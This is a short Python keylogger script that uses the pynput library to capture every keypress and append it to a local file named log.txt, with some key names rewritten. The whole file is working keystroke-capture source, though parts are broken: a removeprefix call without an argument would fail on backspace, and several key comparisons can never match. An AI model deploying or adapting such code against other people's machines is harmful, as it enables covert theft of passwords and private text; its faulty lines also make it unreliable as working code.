from pynput.keyboard import Listener, Key

def writetofile(key):
    letter = str(key)
    # ======== key replace ========
    letter = letter.replace("'","")
    if letter == "key.alt":
        letter = ""
    if letter == "Key.space":
        letter = " "
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.backspace":
        letter.removeprefix()
    letter = letter.replace("Key.backspace"," (user press backspace) ")
    letter = letter.replace("Key.tab","\t")
    letter = letter.replace("Key.ctrlz "," (user press ctrlZ) ")
    letter = letter.replace("Key.ctrls ","")
    letter = letter.replace("Key.alt","")


    # creating the file for the keystroke 
    with open("log.txt","a") as file:
        file.write(letter)

with Listener(on_press = writetofile) as l:
    l.join()

